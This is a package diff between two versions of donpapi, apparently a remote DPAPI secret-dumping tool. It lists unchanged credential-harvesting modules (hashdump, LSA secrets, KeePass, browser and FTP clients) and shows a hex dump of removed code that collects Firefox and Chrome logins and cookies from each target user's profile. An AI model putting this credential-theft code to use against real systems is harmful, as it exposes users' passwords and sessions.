### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/databases/robomongo.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/databases/robomongo.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/databases/sqldeveloper.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/databases/sqldeveloper.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/databases/squirrel.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/databases/squirrel.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/games/galconfusion.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/games/galconfusion.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/games/kalypsomedia.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/games/kalypsomedia.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/games/roguestale.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/games/roguestale.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/games/turba.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/games/turba.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/git/gitforwindows.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/git/gitforwindows.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/mails/outlook.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/mails/outlook.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/maven/mavenrepositories.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/maven/mavenrepositories.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/keepass.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/keepass.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/keethief.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/keethief.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/__init__.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/__init__.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/common.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/common.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/crypto.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/crypto.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/hbio.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/hbio.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/kdb4.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/kdb4.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/libkeepass/pureSalsa20.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/libkeepass/pureSalsa20.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/memory/memorydump.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/memory/memorydump.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/multimedia/eyecon.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/multimedia/eyecon.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/php/composer.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/php/composer.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/svn/tortoise.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/svn/tortoise.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/apachedirectorystudio.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/apachedirectorystudio.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/coreftp.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/coreftp.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/cyberduck.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/cyberduck.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/d3des.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/d3des.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/filezilla.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/filezilla.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/filezillaserver.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/filezillaserver.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/ftpnavigator.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/ftpnavigator.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/iisapppool.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/iisapppool.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/iiscentralcertp.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/iiscentralcertp.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/keepassconfig.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/keepassconfig.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/opensshforwindows.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/opensshforwindows.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/openvpn.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/openvpn.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/puttycm.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/puttycm.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/rdpmanager.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/rdpmanager.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/unattended.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/unattended.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/vnc.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/vnc.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/winscp.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/winscp.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/sysadmin/wsl.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/sysadmin/wsl.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/wifi/wifi.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/wifi/wifi.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/autologon.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/autologon.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/cachedump.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/cachedump.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/addrspace.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/addrspace.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/newobj.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/newobj.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/object.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/object.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/types.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/types.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/domcachedump.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/domcachedump.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/hashdump.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/hashdump.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/lsasecrets.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/lsasecrets.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/creddump7/win32/rawreg.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/creddump7/win32/rawreg.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/credfiles.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/credfiles.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/credman.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/credman.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/hashdump.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/hashdump.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/lsa_secrets.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/lsa_secrets.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/ppypykatz.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/ppypykatz.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/vault.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/vault.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/vaultfiles.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/vaultfiles.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lazagne/softwares/windows/windows.py` & `donpapi-1.1.0/donpapi/lazagne/softwares/windows/windows.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/RecentFiles.py` & `donpapi-1.1.0/donpapi/lib/RecentFiles.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/adconnect.py` & `donpapi-1.1.0/donpapi/lib/adconnect.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/certificates.py` & `donpapi-1.1.0/donpapi/lib/certificates.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/compliance_security.py` & `donpapi-1.1.0/donpapi/lib/compliance_security.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/defines.py` & `donpapi-1.1.0/donpapi/lib/defines.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/dpapi.py` & `donpapi-1.1.0/donpapi/lib/dpapi.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/dpapi_pick/credhist.py` & `donpapi-1.1.0/donpapi/lib/dpapi_pick/credhist.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/dpapi_pick/crypto.py` & `donpapi-1.1.0/donpapi/lib/dpapi_pick/crypto.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/dpapi_pick/eater.py` & `donpapi-1.1.0/donpapi/lib/dpapi_pick/eater.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/eater.py` & `donpapi-1.1.0/donpapi/lib/eater.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/fileops.py` & `donpapi-1.1.0/donpapi/lib/fileops.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/neo4jconnection.py` & `donpapi-1.1.0/donpapi/lib/neo4jconnection.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/new_module.py` & `donpapi-1.1.0/donpapi/lib/new_module.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/reg.py` & `donpapi-1.1.0/donpapi/lib/reg.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/secretsdump.py` & `donpapi-1.1.0/donpapi/lib/secretsdump.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/toolbox.py` & `donpapi-1.1.0/donpapi/lib/toolbox.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/lib/wmi.py` & `donpapi-1.1.0/donpapi/lib/wmi.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/myseatbelt.py` & `donpapi-1.1.0/donpapi/myseatbelt.py`

 * *Files 2% similar despite different names*

```diff
@@ -1048,5438 +1048,5865 @@
 00004170: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
 00004180: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
 00004190: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
 000041a0: 6c6f 6773 6563 7265 7420 666f 7220 7b64  logsecret for {d
 000041b0: 6174 617d 207b 6263 6f6c 6f72 732e 454e  ata} {bcolors.EN
 000041c0: 4443 7d22 290a 0909 0973 656c 662e 6c6f  DC}")....self.lo
 000041d0: 6767 696e 672e 6465 6275 6728 6578 290a  gging.debug(ex).
-000041e0: 0a09 6465 6620 4765 744d 6f7a 696c 6c61  ..def GetMozilla
-000041f0: 5365 6372 6574 735f 7772 6170 7065 7228  Secrets_wrapper(
-00004200: 7365 6c66 293a 0a09 0973 656c 662e 6c6f  self):...self.lo
-00004210: 6767 696e 672e 696e 666f 2866 225b 7b73  gging.info(f"[{s
-00004220: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-00004230: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
-00004240: 2e4f 4b42 4c55 457d 5b2b 5d20 4761 7468  .OKBLUE}[+] Gath
-00004250: 6572 696e 6720 4d6f 7a69 6c6c 6120 5365  ering Mozilla Se
-00004260: 6372 6574 7320 7b62 636f 6c6f 7273 2e45  crets {bcolors.E
-00004270: 4e44 437d 2229 0a0a 0909 666f 7220 7573  NDC}")....for us
-00004280: 6572 2069 6e20 7365 6c66 2e75 7365 7273  er in self.users
-00004290: 3a0a 0909 0969 6620 7573 6572 2e75 7365  :....if user.use
-000042a0: 726e 616d 6520 3d3d 2027 4d41 4348 494e  rname == 'MACHIN
-000042b0: 4524 273a 0a09 0909 0963 6f6e 7469 6e75  E$':.....continu
-000042c0: 650a 0909 0974 7279 3a0a 0909 0909 6d79  e....try:.....my
-000042d0: 6f70 7469 6f6e 7320 3d20 636f 7079 2e64  options = copy.d
-000042e0: 6565 7063 6f70 7928 7365 6c66 2e6f 7074  eepcopy(self.opt
-000042f0: 696f 6e73 290a 0909 0909 6d79 6f70 7469  ions).....myopti
-00004300: 6f6e 732e 6669 6c65 203d 204e 6f6e 6520  ons.file = None 
-00004310: 2023 2022 6368 726f 6d65 5f65 6e63 5f62   # "chrome_enc_b
-00004320: 6c6f 622e 746d 7022 2020 2320 424c 4f42  lob.tmp"  # BLOB
-00004330: 2074 6f20 7061 7273 650a 0909 0909 6d79   to parse.....my
-00004340: 6f70 7469 6f6e 732e 6b65 7920 3d20 4e6f  options.key = No
-00004350: 6e65 0a09 0909 096d 796f 7074 696f 6e73  ne.....myoptions
-00004360: 2e6d 6173 7465 726b 6579 7320 3d20 4e6f  .masterkeys = No
-00004370: 6e65 0a09 0909 096d 7946 6972 6566 6f78  ne.....myFirefox
-00004380: 5365 6372 6574 7320 3d20 4649 5245 464f  Secrets = FIREFO
-00004390: 585f 4c4f 4749 4e53 286d 796f 7074 696f  X_LOGINS(myoptio
-000043a0: 6e73 2c20 7365 6c66 2e6c 6f67 6769 6e67  ns, self.logging
-000043b0: 2c20 7573 6572 2c20 7365 6c66 2e6d 7966  , user, self.myf
-000043c0: 696c 656f 7073 2c20 7365 6c66 2e64 6229  ileops, self.db)
-000043d0: 0a09 0909 096d 7946 6972 6566 6f78 5365  .....myFirefoxSe
-000043e0: 6372 6574 732e 7275 6e28 290a 0909 0965  crets.run()....e
-000043f0: 7863 6570 7420 4578 6365 7074 696f 6e20  xcept Exception 
-00004400: 6173 2065 783a 0a09 0909 0973 656c 662e  as ex:.....self.
-00004410: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-00004420: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-00004430: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-00004440: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
-00004450: 477d 4578 6365 7074 696f 6e20 4765 744d  G}Exception GetM
-00004460: 6f7a 696c 6c61 5365 6372 6574 735f 7772  ozillaSecrets_wr
-00004470: 6170 7065 7220 666f 7220 7b75 7365 722e  apper for {user.
-00004480: 7573 6572 6e61 6d65 7d20 7b62 636f 6c6f  username} {bcolo
-00004490: 7273 2e45 4e44 437d 2229 0a09 0909 0973  rs.ENDC}").....s
-000044a0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-000044b0: 6728 6578 290a 0a09 6465 6620 4765 7443  g(ex)...def GetC
-000044c0: 6872 6f6d 6553 6563 7265 7473 2873 656c  hromeSecrets(sel
-000044d0: 6629 3a0a 0909 7365 6c66 2e6c 6f67 6769  f):...self.loggi
-000044e0: 6e67 2e69 6e66 6f28 6622 5b7b 7365 6c66  ng.info(f"[{self
-000044f0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-00004500: 6970 7d5d 207b 6263 6f6c 6f72 732e 4f4b  ip}] {bcolors.OK
-00004510: 424c 5545 7d5b 2b5d 2047 6174 6865 7269  BLUE}[+] Gatheri
-00004520: 6e67 2043 6872 6f6d 6520 5365 6372 6574  ng Chrome Secret
-00004530: 7320 7b62 636f 6c6f 7273 2e45 4e44 437d  s {bcolors.ENDC}
-00004540: 2229 0a09 0962 6c61 636b 6c69 7374 203d  ")...blacklist =
-00004550: 205b 272e 272c 2027 2e2e 275d 0a09 0923   ['.', '..']...#
-00004560: 2050 6172 7365 2063 6872 6f6d 650a 0909   Parse chrome...
-00004570: 2320 6175 7472 6573 206e 6176 6967 6174  # autres navigat
-00004580: 6575 7273 203f 0a0a 0909 7573 6572 5f64  eurs ?....user_d
-00004590: 6972 6563 746f 7269 6573 203d 205b 2822  irectories = [("
-000045a0: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
-000045b0: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
-000045c0: 6c5c 5c47 6f6f 676c 655c 5c43 6872 6f6d  l\\Google\\Chrom
-000045d0: 655c 5c55 7365 7220 4461 7461 222c 2027  e\\User Data", '
-000045e0: 4c6f 6361 6c20 5374 6174 6527 2c0a 0909  Local State',...
-000045f0: 0909 0909 0920 2743 6872 6f6d 654c 6f63  ..... 'ChromeLoc
-00004600: 616c 5374 6174 6527 2c20 2744 4f4d 4149  alState', 'DOMAI
-00004610: 4e27 292c 0a09 0909 0909 0909 2822 5573  N'),........("Us
-00004620: 6572 735c 5c7b 7573 6572 6e61 6d65 7d5c  ers\\{username}\
-00004630: 5c41 7070 4461 7461 5c5c 4c6f 6361 6c5c  \AppData\\Local\
-00004640: 5c47 6f6f 676c 655c 5c43 6872 6f6d 655c  \Google\\Chrome\
-00004650: 5c55 7365 7220 4461 7461 5c5c 4465 6661  \User Data\\Defa
-00004660: 756c 7422 2c20 2743 6f6f 6b69 6573 272c  ult", 'Cookies',
-00004670: 0a09 0909 0909 0909 2027 4368 726f 6d65  ........ 'Chrome
-00004680: 436f 6f6b 6965 7327 2c20 2744 4f4d 4149  Cookies', 'DOMAI
-00004690: 4e27 292c 0a09 0909 0909 0909 2822 5573  N'),........("Us
-000046a0: 6572 735c 5c7b 7573 6572 6e61 6d65 7d5c  ers\\{username}\
-000046b0: 5c41 7070 4461 7461 5c5c 4c6f 6361 6c5c  \AppData\\Local\
-000046c0: 5c47 6f6f 676c 655c 5c43 6872 6f6d 655c  \Google\\Chrome\
-000046d0: 5c55 7365 7220 4461 7461 5c5c 4465 6661  \User Data\\Defa
-000046e0: 756c 7422 2c0a 0909 0909 0909 0920 2745  ult",........ 'E
-000046f0: 7874 656e 7369 6f6e 2043 6f6f 6b69 6573  xtension Cookies
-00004700: 272c 2027 4368 726f 6d65 436f 6f6b 6965  ', 'ChromeCookie
-00004710: 7327 2c20 2744 4f4d 4149 4e27 292c 0a09  s', 'DOMAIN'),..
-00004720: 0909 0909 0909 280a 0909 0909 0909 0922  ......(........"
-00004730: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
-00004740: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
-00004750: 6c5c 5c47 6f6f 676c 655c 5c43 6872 6f6d  l\\Google\\Chrom
-00004760: 655c 5c55 7365 7220 4461 7461 5c5c 4465  e\\User Data\\De
-00004770: 6661 756c 745c 5c4e 6574 776f 726b 222c  fault\\Network",
-00004780: 2027 436f 6f6b 6965 7327 2c0a 0909 0909   'Cookies',.....
-00004790: 0909 0927 4368 726f 6d65 436f 6f6b 6965  ...'ChromeCookie
-000047a0: 7327 2c20 2744 4f4d 4149 4e27 292c 0a09  s', 'DOMAIN'),..
-000047b0: 0909 0909 0909 280a 0909 0909 0909 0922  ......(........"
-000047c0: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
-000047d0: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
-000047e0: 6c5c 5c47 6f6f 676c 655c 5c43 6872 6f6d  l\\Google\\Chrom
-000047f0: 655c 5c55 7365 7220 4461 7461 5c5c 4465  e\\User Data\\De
-00004800: 6661 756c 745c 5c53 6166 6520 4272 6f77  fault\\Safe Brow
-00004810: 7369 6e67 204e 6574 776f 726b 222c 0a09  sing Network",..
-00004820: 0909 0909 0909 2753 6166 6520 4272 6f77  ......'Safe Brow
-00004830: 7369 6e67 2043 6f6f 6b69 6573 272c 2027  sing Cookies', '
-00004840: 4368 726f 6d65 436f 6f6b 6965 7327 2c20  ChromeCookies', 
-00004850: 2744 4f4d 4149 4e27 292c 0a09 0909 0909  'DOMAIN'),......
-00004860: 0909 2822 5573 6572 735c 5c7b 7573 6572  ..("Users\\{user
-00004870: 6e61 6d65 7d5c 5c41 7070 4461 7461 5c5c  name}\\AppData\\
-00004880: 4c6f 6361 6c5c 5c47 6f6f 676c 655c 5c43  Local\\Google\\C
-00004890: 6872 6f6d 655c 5c55 7365 7220 4461 7461  hrome\\User Data
-000048a0: 5c5c 4465 6661 756c 7422 2c20 274c 6f67  \\Default", 'Log
-000048b0: 696e 2044 6174 6127 2c0a 0909 0909 0909  in Data',.......
-000048c0: 0920 2743 6872 6f6d 654c 6f67 696e 4461  . 'ChromeLoginDa
-000048d0: 7461 272c 2027 444f 4d41 494e 2729 2c0a  ta', 'DOMAIN'),.
-000048e0: 0909 0909 0909 0928 2255 7365 7273 5c5c  .......("Users\\
-000048f0: 7b75 7365 726e 616d 657d 5c5c 4170 7044  {username}\\AppD
-00004900: 6174 615c 5c4c 6f63 616c 5c5c 476f 6f67  ata\\Local\\Goog
-00004910: 6c65 5c5c 4368 726f 6d65 5c5c 5573 6572  le\\Chrome\\User
-00004920: 2044 6174 6122 2c20 274c 6173 7420 5665   Data", 'Last Ve
-00004930: 7273 696f 6e27 2c0a 0909 0909 0909 0920  rsion',........ 
-00004940: 2743 6872 6f6d 6556 6572 7369 6f6e 272c  'ChromeVersion',
-00004950: 2027 444f 4d41 494e 2729 2c0a 0909 0909   'DOMAIN'),.....
-00004960: 0909 095d 0a0a 0909 666f 7220 7573 6572  ...]....for user
-00004970: 2069 6e20 7365 6c66 2e75 7365 7273 3a0a   in self.users:.
-00004980: 0909 0969 6620 7573 6572 2e75 7365 726e  ...if user.usern
-00004990: 616d 6520 3d3d 2027 4d41 4348 494e 4524  ame == 'MACHINE$
-000049a0: 273a 0a09 0909 0963 6f6e 7469 6e75 650a  ':.....continue.
-000049b0: 0909 0965 6c73 653a 0a09 0909 0964 6972  ...else:.....dir
-000049c0: 6563 746f 7269 6573 5f74 6f5f 7573 6520  ectories_to_use 
-000049d0: 3d20 7573 6572 5f64 6972 6563 746f 7269  = user_directori
-000049e0: 6573 0a09 0909 096d 796f 7074 696f 6e73  es.....myoptions
-000049f0: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
-00004a00: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
-00004a10: 0909 096d 796f 7074 696f 6e73 2e66 696c  ...myoptions.fil
-00004a20: 6520 3d20 4e6f 6e65 2020 2320 2263 6872  e = None  # "chr
-00004a30: 6f6d 655f 656e 635f 626c 6f62 2e74 6d70  ome_enc_blob.tmp
-00004a40: 2220 2023 2042 4c4f 4220 746f 2070 6172  "  # BLOB to par
-00004a50: 7365 0a09 0909 096d 796f 7074 696f 6e73  se.....myoptions
-00004a60: 2e6b 6579 203d 204e 6f6e 650a 0909 0909  .key = None.....
-00004a70: 6d79 6f70 7469 6f6e 732e 6d61 7374 6572  myoptions.master
-00004a80: 6b65 7973 203d 204e 6f6e 650a 0909 0909  keys = None.....
-00004a90: 6d79 4368 726f 6d65 5365 6372 6574 7320  myChromeSecrets 
-00004aa0: 3d20 4348 524f 4d45 5f4c 4f47 494e 5328  = CHROME_LOGINS(
-00004ab0: 6d79 6f70 7469 6f6e 732c 2073 656c 662e  myoptions, self.
-00004ac0: 6c6f 6767 696e 672c 2073 656c 662e 6462  logging, self.db
-00004ad0: 2c20 7573 6572 2e75 7365 726e 616d 6529  , user.username)
-00004ae0: 0a0a 0909 0923 2069 6620 6c65 6e28 7573  .....# if len(us
-00004af0: 6572 2e6d 6173 7465 726b 6579 7329 3e30  er.masterkeys)>0
-00004b00: 3a23 5061 7320 6465 206d 6173 7465 726b  :#Pas de masterk
-00004b10: 6579 733d 3d70 6173 2064 6520 6461 7461  eys==pas de data
-00004b20: 7320 6120 7265 6375 700a 0909 0966 6f72  s a recup....for
-00004b30: 2069 6e66 6f20 696e 2064 6972 6563 746f   info in directo
-00004b40: 7269 6573 5f74 6f5f 7573 653a 0a09 0909  ries_to_use:....
-00004b50: 096d 795f 6469 722c 206d 795f 6d61 736b  .my_dir, my_mask
-00004b60: 2c20 6d79 5f62 6c6f 625f 7479 7065 2c20  , my_blob_type, 
-00004b70: 6d79 5f75 7365 725f 7479 7065 203d 2069  my_user_type = i
-00004b80: 6e66 6f0a 0909 0909 746d 705f 7077 6420  nfo.....tmp_pwd 
-00004b90: 3d20 6d79 5f64 6972 2e66 6f72 6d61 7428  = my_dir.format(
-00004ba0: 0a09 0909 0909 7573 6572 6e61 6d65 3d75  ......username=u
-00004bb0: 7365 722e 7573 6572 6e61 6d65 2920 2023  ser.username)  #
-00004bc0: 2074 6d70 5f70 7764 203d 2066 2255 7365   tmp_pwd = f"Use
-00004bd0: 7273 5c5c 7b75 7365 722e 7573 6572 6e61  rs\\{user.userna
-00004be0: 6d65 7d5c 5c7b 6d79 5f64 6972 7d22 236e  me}\\{my_dir}"#n
-00004bf0: 7470 6174 682e 6a6f 696e 286e 7470 6174  tpath.join(ntpat
-00004c00: 682e 6a6f 696e 2827 5573 6572 7327 2c20  h.join('Users', 
-00004c10: 7573 6572 2e75 7365 726e 616d 6529 2c20  user.username), 
-00004c20: 6d79 5f64 6972 290a 0909 0909 7365 6c66  my_dir).....self
-00004c30: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
-00004c40: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-00004c50: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-00004c60: 5d20 4c6f 6f6b 696e 6720 666f 7220 7b75  ] Looking for {u
-00004c70: 7365 722e 7573 6572 6e61 6d65 7d20 6669  ser.username} fi
-00004c80: 6c65 7320 696e 207b 746d 705f 7077 647d  les in {tmp_pwd}
-00004c90: 2077 6974 6820 6d61 736b 207b 6d79 5f6d   with mask {my_m
-00004ca0: 6173 6b7d 2229 0a09 0909 096d 795f 6469  ask}").....my_di
